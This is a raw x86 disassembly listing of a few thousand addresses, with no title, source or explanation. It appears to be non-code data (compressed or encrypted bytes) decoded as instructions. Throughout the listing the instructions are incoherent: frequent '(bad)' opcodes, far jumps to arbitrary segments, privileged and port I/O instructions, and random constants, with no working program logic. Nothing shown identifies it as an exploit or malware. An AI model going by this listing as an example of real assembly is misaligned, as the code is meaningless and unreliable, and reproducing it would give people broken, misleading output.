  42231d:	scas   eax,DWORD PTR es:[edi]
  42231e:	fdiv   DWORD PTR [edi]
  422320:	or     ch,BYTE PTR [esi+0x66]
  422323:	inc    eax
  422324:	lahf   
  422325:	sub    eax,0x97d22359
  42232a:	das    
  42232b:	jmp    0x3bfe:0x35c7f01e
  422332:	lea    esp,[edx-0x105011fd]
  422338:	dec    edi
  422339:	jae    0x4222d2
  42233b:	loope  0x4222e2
  42233d:	add    BYTE PTR [eax],al
  42233f:	add    BYTE PTR [eax],al
  422341:	add    BYTE PTR [edx+0x4],dl
  422344:	mov    ds:0x72a6f682,al
  422349:	aam    0x6d
  42234b:	xor    dh,BYTE PTR [edx]
  42234d:	and    eax,0xe20e855a
  422352:	xlat   BYTE PTR ds:[ebx]
  422353:	fld    DWORD PTR [ecx]
  422355:	add    BYTE PTR [ebx+0x0],ah
  422358:	add    BYTE PTR [eax],al
  42235a:	(bad)  
  42235b:	ss int3 
  42235d:	mov    ebp,0xf6fb6410
  422362:	jg     0x4223c7
  422364:	sub    eax,0xd50d2a12
  422369:	loopne 0x422368
  42236b:	into   
  42236c:	fdiv   DWORD PTR [ecx+0x64afdcce]
  422372:	lahf   
  422373:	xor    edi,ebx
  422375:	stos   BYTE PTR es:[edi],al
  422376:	in     eax,0x3a
  422378:	sbb    al,0x31
  42237a:	cmp    al,0x13
  42237c:	xor    eax,0xf9f2b27e
  422382:	lods   eax,DWORD PTR ds:[esi]
  422383:	std    
  422384:	inc    edi
  422385:	or     dl,BYTE PTR [ebx+ecx*4-0x18]
  422389:	jmp    0x6651b59e
  42238e:	std    
  42238f:	(bad)  
  422390:	cmp    cl,bh
  422392:	sub    al,BYTE PTR [ebp+0x503886d1]
  422398:	or     bh,BYTE PTR [eax+0x5627dc72]
  42239e:	imul   ecx,ecx,0xffffff8e
  4223a1:	dec    edx
  4223a2:	int    0x95
  4223a4:	leave  
  4223a5:	jp     0x422425
  4223a7:	or     al,0xab
  4223a9:	push   esi
  4223aa:	cmp    ch,BYTE PTR [eax+0x77]
  4223ad:	xor    dl,0x69
  4223b0:	mov    ss,esi
  4223b2:	jno    0x422345
  4223b4:	int    0xc7
  4223b6:	push   0xffffffd0
  4223b8:	push   edi
  4223b9:	sbb    DWORD PTR [ecx],esi
  4223bb:	ins    DWORD PTR es:[edi],dx
  4223bc:	lock add BYTE PTR [eax],al
  4223bf:	add    BYTE PTR [eax],al
  4223c1:	add    BYTE PTR [eax],bh
  4223c3:	push   0xffffff96
  4223c5:	add    edx,esi
  4223c7:	(bad)  
  4223c8:	mov    ebp,0xdb4ef67b
  4223cd:	out    0x82,eax
  4223cf:	stc    
  4223d0:	xor    dh,ah
  4223d2:	cmp    bl,dl
  4223d4:	add    DWORD PTR [eax],eax
  4223d6:	arpl   WORD PTR [eax],ax
  4223d8:	add    BYTE PTR [eax],al
  4223da:	jne    0x4223f6
  4223dc:	mov    esp,0xdb128eaf
  4223e1:	sahf   
  4223e2:	out    dx,al
  4223e3:	retf   
  4223e4:	jle    0x4223d9
  4223e6:	mov    edx,0x3488982d
  4223eb:	outs   dx,DWORD PTR ds:[si]
  4223ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223ee:	push   ebx
  4223ef:	sub    DWORD PTR [ecx-0x2f],ebx
  4223f2:	mov    edi,DWORD PTR [esp+eiz*2-0x39]
  4223f6:	xchg   ecx,eax
  4223f7:	lods   eax,DWORD PTR ds:[esi]
  4223f8:	fsubr  st(7),st
  4223fa:	(bad)  
  4223fb:	and    BYTE PTR [edi],bl
  4223fd:	dec    esp
  4223fe:	add    DWORD PTR [esi+0x5b1554d0],ebp
  422404:	xchg   edx,eax
  422405:	out    dx,al
  422406:	xchg   edx,eax
  422407:	adc    ebp,DWORD PTR [esi+0x17]
  42240a:	das    
  42240b:	(bad)  
  42240c:	xchg   edx,eax
  42240d:	(bad)  
  42240e:	push   0xffffff95
  422410:	mov    dh,dl
  422412:	aam    0x7f
  422414:	cmp    al,bh
  422416:	popa   
  422417:	loope  0x4223f2
  422419:	jmp    0x3688:0x807c2455
  422420:	iret   
  422421:	fwait
  422422:	xchg   ebp,eax
  422423:	mov    ah,0xac
  422425:	repnz and BYTE PTR gs:[ebp+0x1b0071e0],dh
  42242d:	mov    dh,ch
  42242f:	jns    0x42248b
  422431:	imul   esi,DWORD PTR [eax],0x7f177a98
  422437:	mov    DWORD PTR [edi],ebx
  422439:	cmp    edx,DWORD PTR [esi-0x3]
  42243c:	jne    0x42243e
  42243e:	add    BYTE PTR [eax],al
  422440:	add    BYTE PTR [eax],al
  422442:	jmp    0x7a729f00
  422447:	repz jmp 0x422443
  42244a:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42244e:	shl    DWORD PTR [edi+eax*8+0x1da9d0d],0x0
  422456:	arpl   WORD PTR [eax],ax
  422458:	add    BYTE PTR [eax],al
  42245a:	pop    ebx
  42245b:	arpl   sp,di
  42245d:	test   DWORD PTR [ecx+0x67],eax
  422460:	cmp    eax,0x8c9bc407
  422465:	imul   esi,eax,0xa13afc46
  42246b:	icebp  
  42246c:	mov    cl,0x7
  42246e:	ja     0x422441
  422470:	shl    DWORD PTR [ebx+0x3da12662],cl
  422476:	inc    esp
  422477:	jg     0x4224da
  422479:	mov    bl,bh
  42247b:	dec    ebp
  42247c:	xor    DWORD PTR [ecx-0x4f],edi
  42247f:	ins    DWORD PTR es:[edi],dx
  422480:	sbb    eax,0x3284fa66
  422485:	pop    edx
  422486:	ins    DWORD PTR es:[edi],dx
  422487:	push   ds
  422488:	mov    ecx,0xe248176a
  42248d:	daa    
  42248e:	dec    esp
  42248f:	mov    cl,0x26
  422491:	jmp    0xde51:0xeaff3ffc
  422498:	daa    
  422499:	fnsave [edi-0x70]
  42249c:	add    eax,0x5e1d68ed
  4224a1:	or     al,0x95
  4224a3:	in     al,0x0
  4224a5:	xchg   ebp,eax
  4224a6:	repnz arpl WORD PTR [eax],bp
  4224a9:	add    esp,DWORD PTR [ecx+0x4a]
  4224ac:	sub    edx,DWORD PTR [ebp-0x54]
  4224af:	cdq    
  4224b0:	sbb    dl,BYTE PTR [eax+0x7d]
  4224b3:	jmp    0xe9de17ec
  4224b8:	mov    al,ds:0x98d7489a
  4224bd:	add    BYTE PTR [eax],al
  4224bf:	add    BYTE PTR [eax],al
  4224c1:	add    BYTE PTR [ebx+0x41],bl
  4224c4:	pop    ebx
  4224c5:	iret   
  4224c6:	pop    ebx
  4224c7:	(bad)  
  4224c9:	aad    0xf
  4224cb:	ss dec esp
  4224cd:	dec    esi
  4224ce:	inc    ebx
  4224cf:	inc    eax
  4224d0:	call   0x21d256f
  4224d5:	add    BYTE PTR [ebx+0x0],ah
  4224d8:	add    BYTE PTR [eax],al
  4224da:	push   ds
  4224db:	mov    ebp,0xb347255f
  4224e0:	mov    cl,0x70
  4224e2:	leave  
  4224e3:	jmp    0x422527
  4224e5:	lock sub esi,DWORD PTR ds:0xfc9cd330
  4224ec:	xchg   ebx,eax
  4224ed:	hlt    
  4224ee:	mov    ah,0x6e
  4224f0:	inc    ebx
  4224f1:	addr16 push 0xffffffbd
  4224f4:	add    BYTE PTR [edx],al
  4224f6:	repnz mov ebx,0x64f7ccc6
  4224fc:	int3   
  4224fd:	xchg   esi,eax
  4224fe:	mov    al,0x1c
  422500:	sub    BYTE PTR [edi+0x50c1545b],cl
  422506:	xor    eax,0xc0f23fcc
  42250b:	imul   edx,DWORD PTR [esi+0x2d],0x354c0fb0
  422512:	adc    BYTE PTR [edi+0x24],dh
  422515:	dec    ecx
  422516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422517:	or     eax,0x7b78cde9
  42251c:	gs lahf 
  42251e:	xchg   esi,eax
  42251f:	shr    DWORD PTR [eax],cl
  422521:	in     eax,0x35
  422523:	sub    ah,BYTE PTR [ebx]
  422525:	adc    al,0x5b
  422527:	popa   
  422528:	cwde   
  422529:	adc    al,0xe2
  42252b:	dec    eax
  42252c:	test   eax,0x1b3612d4
  422531:	hlt    
  422532:	push   ebp
  422533:	bound  esp,QWORD PTR [eax]
  422535:	scas   al,BYTE PTR es:[edi]
  422536:	es (bad) 
  422538:	imul   ebp,DWORD PTR [ecx+0xce8166],0x0
  42253f:	add    BYTE PTR [eax],al
  422541:	add    BYTE PTR [ebx+0x7f3c6585],bl
  422547:	cld    
  422548:	(bad)  [edi-0x65be08a1]
  42254e:	int3   
  42254f:	pop    ebx
  422550:	inc    ecx
  422551:	sub    DWORD PTR [ebx-0x25],esp
  422554:	add    DWORD PTR [eax],eax
  422556:	arpl   WORD PTR [eax],ax
  422558:	add    BYTE PTR [eax],al
  42255a:	mov    dl,0x7f
  42255c:	es jmp 0x4224e7
  42255f:	(bad)  
  422560:	in     eax,0x37
  422562:	dec    esp
  422563:	daa    
  422564:	data16 jecxz 0x422527
  422567:	push   ds
  422568:	or     eax,0x76b2805e
  42256d:	ficom  WORD PTR [edx]
  42256f:	jg     0x4225b4
  422571:	or     al,0xc5
  422573:	lods   eax,DWORD PTR ds:[esi]
  422574:	add    DWORD PTR [edx+ecx*1],eax
  422577:	jle    0x42253e
  422579:	or     ebp,edi
  42257b:	and    ebx,DWORD PTR [eax+0x59ad38b3]
  422581:	outs   dx,DWORD PTR ds:[esi]
  422582:	cdq    
  422583:	push   esp
  422584:	sub    dh,BYTE PTR [esi-0x11a68803]
  42258a:	xor    al,0x69
  42258c:	test   bh,al
  42258e:	lahf   
  42258f:	jne    0x422571
  422591:	mov    cx,0x2a4b
  422595:	xchg   esi,eax
  422596:	pop    edx
  422597:	ret    0xd811
  42259a:	pop    es
  42259b:	xchg   BYTE PTR [ecx+esi*8],dh
  42259e:	ret    
  42259f:	push   edx
  4225a0:	hlt    
  4225a1:	in     eax,0xe1
  4225a3:	jmp    0x9212:0xfcbb6be2
  4225aa:	(bad)  
  4225ab:	pop    edx
  4225ac:	(bad)  
  4225ad:	and    edx,DWORD PTR fs:[eax+eiz*1]
  4225b1:	sbb    al,0xff
  4225b3:	or     eax,0x3071e1bf
  4225b8:	pop    esi
  4225b9:	(bad)  
  4225ba:	mov    ecx,edi
  4225bc:	lds    eax,FWORD PTR [eax]
  4225be:	add    BYTE PTR [eax],al
  4225c0:	add    BYTE PTR [eax],al
  4225c2:	outs   dx,BYTE PTR ds:[esi]
  4225c3:	jae    0x4225b5
  4225c5:	retf   0xcbfd
  4225c8:	jle    0x4225c1
  4225ca:	repz xor eax,0x56c98ce9
  4225d0:	sub    ebp,0x1dbc6
  4225d6:	arpl   WORD PTR [eax],ax
  4225d8:	add    BYTE PTR [eax],al
  4225da:	dec    ebp
  4225db:	cld    
  4225dc:	xchg   edx,eax
  4225dd:	ins    DWORD PTR es:[edi],dx
  4225de:	mov    dh,0x78
  4225e0:	and    edi,0x12751225
  4225e6:	xor    cl,ah
  4225e8:	mov    cl,0x5e
  4225ea:	sub    eax,0x47a4b46d
  4225ef:	xchg   esp,eax
  4225f0:	xchg   ebx,eax
  4225f1:	jge    0x4225aa
  4225f3:	daa    
  4225f4:	lea    edi,[esp+eiz*2-0x21bb15e5]
  4225fb:	inc    esi
  4225fc:	jmp    FWORD PTR [esp+eax*2]
  4225ff:	xor    cl,bl
  422601:	adc    al,0x27
  422603:	jecxz  0x4225b6
  422605:	jmp    0x422623
  422607:	sbb    DWORD PTR [ebx-0x4],ecx
  42260a:	scas   al,BYTE PTR es:[edi]
  42260b:	xlat   BYTE PTR ds:[ebx]
  42260c:	adc    bl,cl
  42260e:	pop    eax
  42260f:	es leave 
  422611:	arpl   WORD PTR [ebx],bp
  422613:	pushf  
  422614:	adc    esi,DWORD PTR [ecx-0x55]
  422617:	sahf   
  422618:	lods   al,BYTE PTR ds:[esi]
  422619:	ret    
  42261a:	loope  0x4225f8
  42261c:	pop    eax
  42261d:	test   eax,0x322ab75e
  422623:	lods   eax,DWORD PTR ds:[esi]
  422624:	mov    dl,0xc4
  422626:	jns    0x42265d
  422628:	sti    
  422629:	or     DWORD PTR [edi],edi
  42262b:	iret   
  42262c:	aam    0x18
  42262e:	mov    DWORD PTR [esi+0x17d051b7],edx
  422634:	inc    esi
  422635:	mov    ch,0xa0
  422637:	icebp  
  422638:	mov    ds:0x5d012345,al
  42263d:	add    BYTE PTR [eax],al
  42263f:	add    BYTE PTR [eax],al
  422641:	add    ch,dh
  422643:	adc    al,0xae
  422645:	adc    ebp,edi
  422647:	mov    ebx,0x84e6f6fd
  42264c:	lds    ebp,FWORD PTR [edx-0x15df0e67]
  422652:	sub    esp,ebx
  422654:	add    DWORD PTR [eax],eax
  422656:	arpl   WORD PTR [eax],ax
  422658:	add    BYTE PTR [eax],al
  42265a:	daa    
  42265b:	imul   BYTE PTR ds:0x7e59096c
  422661:	sahf   
  422662:	jle    0x422608
  422664:	out    0xcf,al
  422666:	sbb    eax,0x9e86bfc
  42266b:	pop    edi
  42266c:	mov    BYTE PTR [edx],al
  42266e:	jle    0x42263b
  422670:	fild   WORD PTR [esi]
  422672:	fs std 
  422674:	inc    edx
  422675:	cmp    eax,0x5cd999d4
  42267a:	push   ebx
  42267b:	ds mov fs:0x69ea2f34,al
  422682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422683:	or     al,0x26
  422685:	ins    DWORD PTR es:[edi],dx
  422686:	rol    al,0x4b
  422689:	js     0x422623
  42268b:	xor    BYTE PTR ds:0xf28d73a4,bh
  422691:	mov    edi,0xe902b2ff
  422696:	push   0xfaf0af44
  42269b:	sbb    BYTE PTR [ebp+edx*2-0x6a59ae11],0x3a
  4226a3:	xor    BYTE PTR [edx+0x1a],cl
  4226a6:	scas   eax,DWORD PTR es:[edi]
  4226a7:	xor    al,0xc6
  4226a9:	loopne 0x422657
  4226ab:	sahf   
  4226ac:	cdq    
  4226ad:	cmp    BYTE PTR [esi-0x52bbda1f],bh
  4226b3:	(bad)
  4226b7:	lea    ebx,[eax+ecx*2+0x7f]
  4226bb:	and    edi,DWORD PTR [ebx]
  4226bd:	add    BYTE PTR [eax],al
  4226bf:	add    BYTE PTR [eax],al
  4226c1:	add    BYTE PTR [ebx],bh
  4226c3:	mov    cl,0x57
  4226c5:	lock fcomip st,st(6)
  4226c8:	mov    edi,0xbb1c16fb
  4226cd:	rcl    BYTE PTR [edi],0xd7
  4226d0:	out    0xbd,al
  4226d2:	mov    esp,ds
  4226d4:	add    DWORD PTR [eax],eax
  4226d6:	arpl   WORD PTR [eax],ax
  4226d8:	add    BYTE PTR [eax],al
  4226da:	pop    edx
  4226db:	sbb    al,BYTE PTR [ebp-0x10]
  4226de:	shl    BYTE PTR [edi],0xb6
  4226e1:	imul   edi,esp,0x6b
  4226e4:	aas    
  4226e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226e6:	cld    
  4226e7:	stos   BYTE PTR es:[edi],al
  4226e8:	fiadd  DWORD PTR [esi]
  4226ea:	mov    BYTE PTR [esi+0x7d7d2f31],bl
  4226f0:	mov    edx,DWORD PTR [ebx]
  4226f2:	or     DWORD PTR [ebp+0x5eda00f3],edx
  4226f8:	dec    esp
  4226f9:	inc    ebx
  4226fa:	imul   esp,DWORD PTR [edx-0x6b488dc9],0x48a71cc8
  422704:	pop    ds
  422705:	mov    WORD PTR [ecx+0x50913145],ss
  42270b:	push   edi
  42270c:	mul    BYTE PTR [esi+eax*2+0x42]
  422710:	jns    0x422781
  422712:	inc    edi
  422713:	sub    al,bl
  422715:	int3   
  422716:	fistp  WORD PTR [edx-0x31]
  422719:	or     al,0x7b
  42271b:	jge    0x422765
  42271d:	sbb    eax,0xa6667430
  422722:	or     al,0x14
  422724:	ret    
  422725:	push   0x3819a14e
  42272a:	xor    DWORD PTR [edx+ebp*4+0x59],edi
  42272e:	xchg   dl,dh
  422730:	jg     0x422746
  422732:	clc    
  422733:	or     DWORD PTR [edi-0x20],0x4dbd0958
  42273a:	(bad)  
  42273b:	aam    0xb6
  42273d:	add    BYTE PTR [eax],al
  42273f:	add    BYTE PTR [eax],al
  422741:	add    ah,dl
  422743:	sqrtps xmm6,xmm0
  422746:	(bad)  
  422748:	cmc    
  422749:	das    
  42274a:	sbb    BYTE PTR [eax],cl
  42274c:	xchg   ebx,eax
  42274d:	iret   
  42274e:	rcr    DWORD PTR [eax-0x19],cl
  422751:	call   0x440445
  422756:	arpl   WORD PTR [eax],ax
  422758:	add    BYTE PTR [eax],al
  42275a:	push   ss
  42275b:	mov    bl,0x23
  42275d:	xchg   ecx,eax
  42275e:	loope  0x4227a4
  422760:	and    eax,0x532edda9
  422765:	adc    eax,0x8fcc757f
  42276a:	sub    esi,DWORD PTR [ebp-0x1c175a4f]
  422770:	mov    ebp,0x82c5d2a4
  422775:	or     DWORD PTR [eax+0x1d09476b],esi
  42277b:	out    dx,al
  42277c:	pop    dx
  42277e:	sub    DWORD PTR [eax-0x2b6757f],ebp
  422784:	or     edi,esp
  422786:	xchg   esp,eax
  422787:	add    ebp,DWORD PTR [eax+0x38ce3c4b]
  42278d:	xor    DWORD PTR [edx],ebx
  42278f:	dec    ebp
  422790:	and    BYTE PTR [ecx+edi*2+0x20],ah
  422794:	sbb    BYTE PTR [esi+0x1c],dl
  422797:	sbb    cl,BYTE PTR [ebp+0x29]
  42279a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42279c:	fstp   DWORD PTR [edi]
  42279e:	dec    edi
  42279f:	inc    edi
  4227a0:	shl    esi,1
  4227a2:	fld    st(2)
  4227a4:	push   esp
  4227a5:	jmp    0x422754
  4227a7:	iret   
  4227a8:	cli    
  4227a9:	add    ecx,ebx
  4227ab:	push   0x82444b1f
  4227b0:	pusha  
  4227b1:	leave  
  4227b2:	fdivr  DWORD PTR [ebx+ebp*8+0x2606d1d]
  4227b9:	mov    edi,0x842788
  4227be:	add    BYTE PTR [eax],al
  4227c0:	add    BYTE PTR [eax],al
  4227c2:	int    0x2d
  4227c4:	xchg   ebp,eax
  4227c5:	inc    ebx
  4227c6:	cmc    
  4227c7:	sti    
  4227c8:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4227ce:	fs and bl,bh
  4227d1:	sahf   
  4227d2:	push   edx
  4227d3:	fld    QWORD PTR [ecx]
  4227d5:	add    BYTE PTR [ebx+0x0],ah
  4227d8:	add    BYTE PTR [eax],al
  4227da:	push   esi
  4227db:	dec    ebx
  4227dc:	jmp    0xad8bc864
  4227e1:	sub    al,0x6e
  4227e3:	iret   
  4227e4:	cmc    
  4227e5:	xor    DWORD PTR [ebx+0x96fbd07],edi
  4227eb:	es jg  0x422826
  4227ee:	ins    BYTE PTR es:[edi],dx
  4227ef:	mov    WORD PTR [ecx],es
  4227f1:	add    DWORD PTR [ebp+0x50],edx
  4227f4:	aad    0xb6
  4227f6:	lea    esp,[edx+0x78fc02e]
  4227fc:	dec    ecx
  4227fd:	shr    esp,1
  4227ff:	dec    edx
  422800:	js     0x4227dd
  422802:	mov    ebx,edi
  422804:	cmp    edx,edx
  422806:	out    dx,eax
  422807:	dec    edi
  422808:	push   ds
  422809:	jp     0x422888
  42280b:	inc    esi
  42280c:	sub    ecx,DWORD PTR [ebx+0x66]
  42280f:	dec    esp
  422810:	xlat   BYTE PTR ds:[ebx]
  422811:	test   eax,0x228dc12a
  422816:	dec    esp
  422817:	sbb    BYTE PTR [edi+0x2f],ch
  42281a:	dec    ebp
  42281b:	fcmovnu st,st(7)
  42281d:	rcl    BYTE PTR [edx-0x43625498],cl
  422823:	(bad)  
  422825:	hlt    
  422826:	loope  0x4227c5
  422828:	sub    al,0xce
  42282a:	mov    cl,0xa5
  42282c:	scas   eax,DWORD PTR es:[edi]
  42282d:	jne    0x42280b
  42282f:	fcmove st,st(5)
  422831:	sbb    esp,DWORD PTR [ebx+0x71]
  422834:	or     DWORD PTR [ecx+0x54],esi
  422837:	mov    ah,0xec
  422839:	scas   eax,DWORD PTR es:[edi]
  42283a:	add    eax,0xe2f9
  42283f:	add    BYTE PTR [eax],al
  422841:	add    BYTE PTR [ebx],dl
  422843:	fs out 0xb,eax
  422846:	test   DWORD PTR [ebx-0xce58301],0xb60d4cfc
  422850:	push   ebp
  422851:	stc    
  422852:	mov    ch,0xdd
  422854:	add    DWORD PTR [eax],eax
  422856:	arpl   WORD PTR [eax],ax
  422858:	add    BYTE PTR [eax],al
  42285a:	ret    0xd15c
  42285d:	cmp    al,0x6f
  42285f:	and    al,0x3b
  422861:	push   eax
  422862:	hlt    
  422863:	dec    eax
  422864:	(bad)  
  422865:	in     al,dx
  422866:	fsub   DWORD PTR ds:0xf8f39fa4
  42286c:	sub    al,0xa2
  42286e:	ds sub esp,ebp
  422871:	cmp    al,0x7d
  422873:	retf   0xd953
  422876:	and    al,0x3
  422878:	inc    esp
  422879:	jmp    0xa1dddd72
  42287e:	sar    al,1
  422880:	lds    ebp,FWORD PTR [edx+0x5a]
  422883:	popa   
  422884:	fidiv  DWORD PTR [ecx+eax*4-0x10]
  422888:	dec    ebp
  422889:	jbe    0x422820
  42288b:	or     eax,DWORD PTR [edi]
  42288d:	xchg   edx,eax
  42288e:	push   edi
  42288f:	adc    eax,0x5085d736
  422894:	ins    DWORD PTR es:[edi],dx
  422895:	add    ecx,DWORD PTR [ebx-0x6c21c73b]
  42289b:	xchg   ecx,eax
  42289c:	icebp  
  42289d:	jg     0x422867
  42289f:	adc    al,0xbe
  4228a1:	cmp    ch,BYTE PTR [edx+0x383d70db]
  4228a7:	in     eax,dx
  4228a8:	push   edx
  4228a9:	bound  esi,QWORD PTR [eax-0x422333e6]
  4228af:	add    al,0xa5
  4228b1:	push   ecx
  4228b2:	lods   al,BYTE PTR ds:[esi]
  4228b3:	sub    DWORD PTR [ecx+0x719a06b7],esi
  4228b9:	dec    esi
  4228ba:	cld    
  4228bb:	loope  0x4228b8
  4228bd:	add    BYTE PTR [eax],al
  4228bf:	add    BYTE PTR [eax],al
  4228c1:	add    BYTE PTR [esi],dh
  4228c3:	add    dl,BYTE PTR [ebp+0xc]
  4228c6:	jne    0x422927
  4228c8:	jg     0x422904
  4228ca:	clc    
  4228cb:	cs aas 
  4228cd:	push   0xce47d106
  4228d2:	sub    al,0xd0
  4228d4:	add    DWORD PTR [eax],eax
  4228d6:	arpl   WORD PTR [eax],ax
  4228d8:	add    BYTE PTR [eax],al
  4228da:	xor    eax,0x1826a8bf
  4228df:	sahf   
  4228e0:	loopne 0x42294d
  4228e2:	dec    ebp
  4228e3:	dec    esp
  4228e4:	inc    edx
  4228e5:	add    al,0xa6
  4228e7:	mov    dl,0x75
  4228e9:	(bad)  
  4228ea:	dec    esp
  4228eb:	lods   eax,DWORD PTR ds:[esi]
  4228ec:	mov    eax,ds:0x2031e2f
  4228f1:	jmp    0xf5036d1f
  4228f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228f7:	ins    DWORD PTR es:[edi],dx
  4228f8:	imul   eax,ebx,0xffffffad
  4228fb:	outs   dx,BYTE PTR ds:[esi]
  4228fc:	sbb    esi,ecx
  4228fe:	xchg   ebp,eax
  4228ff:	dec    ebp
  422900:	mov    bh,0xa0
  422902:	fld    QWORD PTR [ecx-0x3057baed]
  422908:	jmp    0x4228ae
  42290a:	cwde   
  42290b:	or     BYTE PTR [esp+ebx*1+0x5a],bh
  42290f:	fsubr  DWORD PTR [esi+0xd]
  422912:	gs sahf 
  422914:	push   0x94c00502
  422919:	pusha  
  42291a:	push   ss
  42291b:	ds pop edi
  42291d:	ret    0x3134
  422920:	xor    BYTE PTR [eax+eiz*4+0x4c],0xd1
  422925:	popa   
  422926:	outs   dx,BYTE PTR ds:[esi]
  422927:	xchg   esp,eax
  422928:	mov    eax,ds:0x4f004658
  42292d:	outs   dx,BYTE PTR ds:[esi]
  42292e:	adc    al,0xa2
  422930:	adc    eax,0x96f9ba86
  422935:	push   ebp
  422936:	pop    eax
  422937:	test   BYTE PTR [esp+ecx*4+0xce198a],cl
  42293e:	add    BYTE PTR [eax],al
  422940:	add    BYTE PTR [eax],al
  422942:	or     BYTE PTR [ecx-0x404c48e],dh
  422948:	dec    ecx
  422949:	mov    bl,0x94
  42294b:	je     0x422924
  42294d:	call   0xd08f:0xd54da099
  422954:	add    DWORD PTR [eax],eax
  422956:	arpl   WORD PTR [eax],ax
  422958:	add    BYTE PTR [eax],al
  42295a:	jmp    0x49aea363
  42295f:	and    esp,DWORD PTR [ecx+0x77]
  422962:	push   edx
  422963:	cmp    eax,0x76396d35
  422968:	mov    ds:0x907e13b6,eax
  42296d:	mov    cl,0xe
  42296f:	cmp    DWORD PTR [edi-0x5769b352],esi
  422975:	call   0x56cf627c
  42297a:	in     eax,0x83
  42297c:	cmp    ebp,DWORD PTR [ebx+0x3a]
  42297f:	mov    ah,0x57
  422981:	jmp    FWORD PTR [ecx+esi*2-0x7144a948]
  422988:	icebp  
  422989:	gs cs adc eax,0x8d4d521a
  422990:	out    0x56,al
  422992:	ins    DWORD PTR es:[edi],dx
  422993:	inc    ebp
  422994:	inc    esi
  422995:	sub    BYTE PTR [eax+0x4b],al
  422998:	mov    dh,0xd3
  42299a:	jb     0x422945
  42299c:	lods   eax,DWORD PTR cs:[esi]
  42299e:	cli    
  42299f:	and    eax,ebp
  4229a1:	aam    0x85
  4229a3:	iret   
  4229a4:	ror    BYTE PTR [edx+0x6c],1
  4229a7:	inc    eax
  4229a9:	std    
  4229aa:	mov    WORD PTR [eax-0x37],ss
  4229ad:	xchg   ecx,eax
  4229ae:	sbb    eax,0x2fc6fa4b
  4229b3:	fcom   st(4)
  4229b5:	add    edi,DWORD PTR [edi+0x54]
  4229b8:	callw  0x5ef9
  4229bc:	xchg   edx,eax
  4229bd:	add    BYTE PTR [eax],al
  4229bf:	add    BYTE PTR [eax],al
  4229c1:	add    bh,bl
  4229c3:	push   ebx
  4229c4:	mov    dl,0x4f
  4229c6:	mov    esi,0x67d3ffef
  4229cb:	xchg   ecx,edi
  4229cd:	adc    al,0x3a
  4229cf:	repnz sub al,0xba
  4229d2:	repnz rol BYTE PTR [ecx],1
  4229d5:	add    BYTE PTR [ebx+0x0],ah
  4229d8:	add    BYTE PTR [eax],al
  4229da:	jb     0x422a01
  4229dc:	test   DWORD PTR [ebp-0x462af806],esp
  4229e2:	mov    dh,BYTE PTR [edi]
  4229e4:	cdq    
  4229e5:	ror    DWORD PTR ds:0x3001e04f,1
  4229eb:	inc    eax
  4229ec:	aaa    
  4229ed:	je     0x422a32
  4229ef:	add    al,BYTE PTR [edx-0x6f67799a]
  4229f5:	outs   dx,DWORD PTR ds:[esi]
  4229f6:	mov    eax,0x9d407abf
  4229fb:	jecxz  0x422a23
  4229fd:	push   0x2c
  4229ff:	push   ds
  422a00:	cmc    
  422a01:	mov    al,ds:0x7f829678
  422a06:	jae    0x422a43
  422a08:	cmp    edx,DWORD PTR [eax+edx*4-0xe]
  422a0c:	pop    es
  422a0d:	out    0xbc,al
  422a0f:	(bad)  
  422a10:	loope  0x422a81
  422a12:	sbb    al,BYTE PTR [edx-0x1c4c6c6f]
  422a18:	sub    DWORD PTR [ecx+esi*2-0x23],0xfffffff2
  422a1d:	in     eax,dx
  422a1e:	sub    al,0x27
  422a20:	leave  
  422a21:	fbstp  TBYTE PTR [edx+ebp*1+0x23]
  422a25:	adc    bh,ah
  422a27:	inc    ebp
  422a28:	mov    esi,0x21b64615
  422a2d:	sub    BYTE PTR [ebp-0x1d341735],ch
  422a33:	mov    al,0x9
  422a35:	push   edi
  422a36:	push   eax
  422a37:	fisubr WORD PTR [ecx]
  422a39:	push   cs
  422a3a:	push   eax
  422a3b:	pop    ebx
  422a3c:	call   0x8700:0x0
  422a43:	or     al,0xd3
  422a45:	fcmovu st,st(3)
  422a47:	fisttp WORD PTR [edi+0x640ccb5d]
  422a4d:	push   ss
  422a4e:	lods   eax,DWORD PTR ds:[esi]
  422a4f:	mov    DWORD PTR [esi+0x1d15597],edx
  422a55:	add    BYTE PTR [ebx+0x0],ah
  422a58:	add    BYTE PTR [eax],al
  422a5a:	dec    edx
  422a5b:	or     dl,BYTE PTR [eax]
  422a5d:	icebp  
  422a5e:	shl    ebp,0x15
  422a61:	pop    ecx
  422a62:	stc    
  422a63:	lahf   
  422a64:	ret    
  422a65:	xor    ah,cl
  422a67:	push   ebp
  422a68:	mov    dh,0x52
  422a6a:	xchg   edx,eax
  422a6b:	mov    edi,DWORD PTR [eax-0x15]
  422a6e:	sbb    al,0xdf
  422a70:	jmp    0x1ab8:0xf411a672
  422a77:	mov    ecx,0xc1c37c3b
  422a7c:	adc    DWORD PTR [edx+0x226a5c71],0x8c8a900f
  422a86:	jae    0x422a26
  422a88:	adc    al,0xe
  422a8a:	or     al,0xef
  422a8c:	mov    al,0x44
  422a8e:	scas   eax,DWORD PTR es:[di]
  422a90:	xchg   BYTE PTR [ecx],ch
  422a92:	ins    BYTE PTR es:[edi],dx
  422a93:	and    eax,DWORD PTR [esi+eiz*8]
  422a96:	jns    0x422aa2
  422a98:	in     eax,dx
  422a99:	or     eax,0x25feb822
  422a9e:	fstp   QWORD PTR ds:0x47e8c4f9
  422aa4:	sbb    eax,0xbf46d529
  422aa9:	loope  0x422b12
  422aab:	dec    esi
  422aac:	adc    ecx,DWORD PTR [edi]
  422aae:	and    BYTE PTR [edi],cl
  422ab0:	jmp    0x422b22
  422ab2:	(bad)  
  422ab4:	sbb    ecx,DWORD PTR [edx+0x3c]
  422ab7:	and    eax,0x6773b598
  422abc:	mov    esp,0x0
  422ac1:	add    BYTE PTR [edi-0x28db29d],bl
  422ac7:	jle    0x422a88
  422ac9:	out    dx,eax
  422aca:	sbb    edi,esp
  422acc:	mov    BYTE PTR [esp+esi*8-0x4760976f],dh
  422ad3:	rol    DWORD PTR [ecx],1
